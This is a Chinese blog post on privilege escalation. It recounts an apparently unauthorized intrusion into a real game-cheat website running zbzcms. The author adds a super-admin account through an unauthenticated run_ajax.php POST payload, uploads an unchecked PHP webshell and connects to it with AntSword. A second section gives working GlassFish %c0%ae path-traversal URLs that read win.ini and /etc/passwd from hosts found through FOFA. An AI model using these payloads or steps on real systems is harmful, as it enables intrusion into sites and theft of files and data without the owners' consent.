{"title":"权限提升-网站后台漏洞第三方获取","uid":"f8af41c2e2288536f49250d641a67ce7","slug":"权限提升-网站后台漏洞第三方获取","date":"2022-06-19T01:32:42.000Z","updated":"2022-06-19T11:53:52.360Z","comments":true,"path":"api/articles/权限提升-网站后台漏洞第三方获取.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>脑图：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87.png\" alt=\"权限提升\"></p>\n<h2 id=\"0x01-权限分类\"><a href=\"#0x01-权限分类\" class=\"headerlink\" title=\"0x01 权限分类\"></a>0x01 权限分类</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1、后台权限：（获得方式：爆破，注入猜解，弱口令等获取的帐号密码配合登录）</p>\n<p>一般网站或应用后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件的。（如后台功能存在文件操作的话也可以操作文件数据）</p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>2、网站权限：（获得方式：以上三种思路获取）</p>\n<p>查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>3、数据库权限：操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。</p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>4、接口权限：（邮件，短信，支付，第三方登录等）</p>\n<p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取）。</p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>5、还有其他的系统权限，域控权限等</p></blockquote>\n<h2 id=\"0x02-某外挂网站的简单渗透提权（实战）\"><a href=\"#0x02-某外挂网站的简单渗透提权（实战）\" class=\"headerlink\" title=\"0x02 某外挂网站的简单渗透提权（实战）\"></a>0x02 某外挂网站的简单渗透提权（实战）</h2><h3 id=\"0x00-1\"><a href=\"#0x00-1\" class=\"headerlink\" title=\"0x00\"></a>0x00</h3><p>网站首页：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619173017077.png\" alt=\"image-20220619173017077\"></p>\n<h3 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p>首先看下源代码搜集下相关信息：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619173125971.png\" alt=\"image-20220619173125971\"></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619173338046.png\" alt=\"image-20220619173338046\"></p>\n<p>没有特别的信息，只有图片地址，和相关页面的目录。</p>\n<p>搜索一下图片地址：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619173714602.png\" alt=\"image-20220619173714602\"></p>\n<p>可以看到应该是zbzcms的模板。</p>\n<h3 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p>找到站帮主源码进行下载，查看其结构：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619173930890.png\" alt=\"image-20220619173930890\"></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619174050077.png\" alt=\"image-20220619174050077\"></p>\n<p>在源码中找到后台登录地址：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619174152402.png\" alt=\"image-20220619174152402\"></p>\n<h3 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><p>尝试访问某外挂网站的后台地址：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619174352395.png\" alt=\"image-20220619174352395\"></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619174325254.png\" alt=\"image-20220619174325254\"></p>\n<p>可以看到后台登录界面；没有账号密码就拿不到后台权限，找一下zbzcms的相关漏洞。</p>\n<h3 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h3><p>使用seay打开其源码进行审计，先自动审计一波，尤其是要找SQL注入漏洞可以获取管理员账号密码，或者直接未授权访问：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619175308093.png\" alt=\"image-20220619175308093\"></p>\n<p>看到<code>admin</code>文件夹下的文件存在<code>insert(&#39;admin&#39;,$POST);</code>字段，猜测admin字段是添加管理员的字段，打开源码审计：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619175523695.png\" alt=\"image-20220619175523695\"></p>\n<p>可以看到确实是添加管理员的代码段。</p>\n<p>可以看到<code>mima</code>和<code>guanliyuan</code>可疑字段，接收密码和管理员参数。</p>\n<p>若变量<code>$run==&#39;admin&#39;</code>则使用<code>POST</code>方法接收的<code>mima</code>和<code>guanliyuan</code>&#x3D;登录时接收的<code>mima</code>和<code>guanliyuan</code>，就进行管理员的添加。</p>\n<h3 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h3><p>构造payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">URL：&#x2F;cms&#x2F;cms&#x2F;admin&#x2F;run_ajax.php?run&#x3D;admin\n    POST数据：mima&#x3D;123456&amp;guanliyuan&#x3D;hhh<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>利用插件执行payload：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619180927410.png\" alt=\"image-20220619180927410\"></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619180944843.png\" alt=\"image-20220619180944843\"></p>\n<p>执行payload后有返回值，返回了117。</p>\n<h3 id=\"0x06\"><a href=\"#0x06\" class=\"headerlink\" title=\"0x06\"></a>0x06</h3><p>尝试使用账号密码登录：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619183236305.png\" alt=\"image-20220619183236305\"></p>\n<p>这里登录不成功是由于权限不足。</p>\n<p>分析代码可知，需要添加dengji&#x3D;1，设置为超级管理员：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619190225512.png\" alt=\"image-20220619190225512\"></p>\n<p>payload中加入dengji&#x3D;1：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">mima&#x3D;123456&amp;guanliyuan&#x3D;hhh&amp;dengji&#x3D;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619183326562.png\" alt=\"image-20220619183326562\"></p>\n<p>继续尝试登录，成功登录后台：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619183136667.png\" alt=\"image-20220619183136667\"></p>\n<p>这里已经拿到了后台权限，继续提权，拿到网站权限。</p>\n<h3 id=\"0x07\"><a href=\"#0x07\" class=\"headerlink\" title=\"0x07\"></a>0x07</h3><p>来到根目录看到upload，应该是上传图片的目录：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619183704120.png\" alt=\"image-20220619183704120\"></p>\n<p>打开upload看到有上传功能：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619183833143.png\" alt=\"image-20220619183833143\"></p>\n<p>先尝试上传，看看有没有验证：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619184021287.png\" alt=\"image-20220619184021287\"></p>\n<p>成功上传1.php文件（一点没有验证）。</p>\n<h3 id=\"0x08\"><a href=\"#0x08\" class=\"headerlink\" title=\"0x08\"></a>0x08</h3><p>使用蚁剑连接：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619184213252.png\" alt=\"image-20220619184213252\"></p>\n<p>可以看到有网站备份文件，可以直接打包下载。</p>\n<h2 id=\"0x03-GlassFish-第三方中间件\"><a href=\"#0x03-GlassFish-第三方中间件\" class=\"headerlink\" title=\"0x03 GlassFish 第三方中间件\"></a>0x03 GlassFish 第三方中间件</h2><h3 id=\"0x00-2\"><a href=\"#0x00-2\" class=\"headerlink\" title=\"0x00\"></a>0x00</h3><p>FOFA搜索GlassFish的ip</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619193043811.png\" alt=\"image-20220619193043811\"></p>\n<p>其服务是GlassFish。</p>\n<h3 id=\"0x01-1\"><a href=\"#0x01-1\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p>网上搜GlassFish中间件的漏洞：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619193454007.png\" alt=\"image-20220619193454007\"></p>\n<h3 id=\"0x02-1\"><a href=\"#0x02-1\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p>访问地址：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619194349609.png\" alt=\"image-20220619194349609\"></p>\n<p>找到payload执行：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;xxxxx&#x2F;theme&#x2F;theme&#x2F;META-INF&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;windows&#x2F;win.ini<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E7%AC%AC%E4%B8%89%E6%96%B9%E8%8E%B7%E5%8F%96.htm/image-20220619193932397.png\" alt=\"image-20220619193932397\"></p>\n<p>返回win.ini相关数据。</p>\n<p><strong>注意：这里payload执行是要区分windows和linux系统。（上面为windows系统payload）</strong></p>\n<p><strong>Linux系统payload：</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;xxxxx&#x2F;theme&#x2F;META-INF&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;etc&#x2F;passwd<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"0x03-1\"><a href=\"#0x03-1\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><p>后续可利用漏洞进行敏感文件的读取等等。</p>\n<h2 id=\"0x04-总结\"><a href=\"#0x04-总结\" class=\"headerlink\" title=\"0x04 总结\"></a>0x04 总结</h2><p>漏洞产生的原因多层面：操作系统，中间件，网站，后台，数据库，第三方插件等等</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 